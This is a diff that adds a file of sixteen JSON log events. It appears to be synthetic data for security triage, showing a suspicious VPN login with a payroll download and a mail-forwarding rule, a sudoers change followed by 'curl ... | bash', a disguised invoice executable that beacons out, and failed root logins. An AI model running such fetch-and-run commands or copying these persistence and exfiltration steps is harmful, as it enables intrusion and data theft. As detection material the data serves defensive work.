@@ -1,0 +1,16 @@
+{"time": "2026-09-27T03:08:01Z", "type": "auth", "user": "jdoe", "src_ip": "185.220.101.47", "host": "vpn-gw-01", "result": "failure"}
+{"time": "2026-09-27T03:14:22Z", "type": "auth", "user": "jdoe", "src_ip": "185.220.101.47", "host": "vpn-gw-01", "result": "success", "mfa": "push_approved"}
+{"time": "2026-09-27T03:16:40Z", "type": "file_access", "user": "jdoe", "src_ip": "185.220.101.47", "host": "fileshare-02", "path": "/finance/payroll_2026.xlsx", "action": "download"}
+{"time": "2026-09-27T03:18:05Z", "type": "mailbox_rule", "user": "jdoe", "src_ip": "185.220.101.47", "host": "mail", "detail": "Forward all mail to jdoe.backup@proton.me"}
+{"time": "2026-09-26T17:30:00Z", "type": "auth", "user": "jdoe", "src_ip": "10.30.2.44", "host": "sso-portal", "result": "success"}
+{"time": "2026-09-27T13:45:00Z", "type": "auth", "user": "asmith", "src_ip": "10.30.5.21", "host": "sso-portal", "result": "success"}
+{"time": "2026-09-27T14:05:10Z", "type": "auth", "user": "asmith", "src_ip": "52.14.200.9", "host": "sso-portal", "result": "success", "mfa": "totp"}
+{"time": "2026-09-27T22:40:51Z", "type": "ssh", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "result": "success"}
+{"time": "2026-09-27T22:41:03Z", "type": "file_write", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "path": "/etc/sudoers.d/99-temp"}
+{"time": "2026-09-27T22:43:30Z", "type": "process", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "detail": "sudo -i; curl http://10.20.4.15:8000/x.sh | bash"}
+{"time": "2026-09-27T22:39:12Z", "type": "auth", "user": "rpatel", "src_ip": "10.20.4.15", "host": "jump-02", "result": "success"}
+{"time": "2026-09-27T09:10:02Z", "type": "process", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "detail": "Invoice_Sept.pdf.exe spawned rundll32.exe"}
+{"time": "2026-09-27T09:12:45Z", "type": "network", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "dest": "45.137.21.9:443", "bytes_out": 512}
+{"time": "2026-09-27T09:13:45Z", "type": "network", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "dest": "45.137.21.9:443", "bytes_out": 498}
+{"time": "2026-09-27T02:00:03Z", "type": "auth", "user": "admin", "src_ip": "10.10.1.50", "host": "prod-web-01", "result": "failure"}
+{"time": "2026-09-27T02:00:04Z", "type": "auth", "user": "root", "src_ip": "10.10.1.50", "host": "prod-web-02", "result": "failure"}
